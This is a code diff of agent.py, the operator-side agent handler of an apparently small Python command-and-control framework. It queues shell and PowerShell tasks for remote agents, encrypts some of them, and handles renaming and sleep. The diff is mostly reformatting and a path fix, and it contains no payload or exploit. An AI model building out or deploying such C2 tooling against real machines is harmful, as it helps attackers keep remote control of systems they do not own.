@@ -7,31 +7,24 @@ from shutil import rmtree
 
 from common import *
 from encryption import *
-"""
-agent.py
-
-Code that represents the agent handler for the C2
-"""
 
 class Agent:
-    def __init__(self, name, listener, remoteip, hostname, Type, key):
-        self.name = name
-        self.listener = listener
-        self.remoteip = remoteip
-        self.hostname = hostname
-        self.type = Type
-        self.key = key
-        # Sleep time of 3 secs to determine whether agent is dead or not
-        self.sleept = 3
 
-        # Create needed directories and files
-        self.Path = "data/listeners/{}/agents/{}/".format(self.listener, self.name)
+    def __init__(self, name, listener, remoteip, hostname, Type, key):
+
+        self.name      = name
+        self.listener  = listener
+        self.remoteip  = remoteip
+        self.hostname  = hostname
+        self.Type      = Type
+        self.key       = key
+        self.sleept    = 3
+        self.Path      = "data/listeners/{}/agents/{}/".format(self.listener, self.name)
         self.tasksPath = "{}tasks".format(self.Path, self.name)
 
         if os.path.exists(self.Path) == False:
             os.mkdir(self.Path)
-        
-        # Menu functionality 
+
         self.menu = menu.Menu(self.name)
         
         self.menu.registerCommand("shell", "Execute a shell command.", "<command>")
@@ -43,45 +36,47 @@ class Agent:
         self.menu.uCommands()
 
         self.Commands = self.menu.Commands
-        # TODO: Real GUI hours
-
+    
     def writeTask(self, task):
-        # Only encrypts task w/powershell agent
-        if self.type == "p":
+
+        if self.Type == "p":
             task = "VALID " + task
             task = ENCRYPT(task, self.key)
-        elif self.type == "w":
+        elif self.Type == "w":
             task = task
-        
+
         with open(self.tasksPath, "w") as f:
             f.write(task)
-    
+
     def clearTasks(self):
+
         if os.path.exists(self.tasksPath):
             os.remove(self.tasksPath)
         else:
             pass
 
-    # Updates paths when agent is renamed
     def update(self):
+        
         self.menu.name = self.name
-        self.Path = "data/listeners/{}/agents{}/".format(self.listener, self.name)
+        self.Path      = "data/listeners/{}/agents/{}/".format(self.listener, self.name)
         self.tasksPath = "{}tasks".format(self.Path, self.name)
-
+        
         if os.path.exists(self.Path) == False:
             os.mkdir(self.Path)
-    
+        
     def rename(self, newname):
-        task = "rename " + newname
+        
+        task    = "rename " + newname
         self.writeTask(task)
-
-        progress("Waiting for agent...")
+        
+        progress("Waiting for agent.")
         while os.path.exists(self.tasksPath):
             pass
         
         return 0
 
     def shell(self, args):
+
         if len(args) == 0:
             error("Missing command.")
         else:
@@ -90,6 +85,7 @@ class Agent:
             self.writeTask(task)
 
     def powershell(self, args):
+        
         if len(args) == 0:
             error("Missing command.")
         else:
@@ -98,6 +94,7 @@ class Agent:
             self.writeTask(task)
 
     def sleep(self, args):
+
         if len(args) != 1:
             error("Invalid arguments.")
         else:
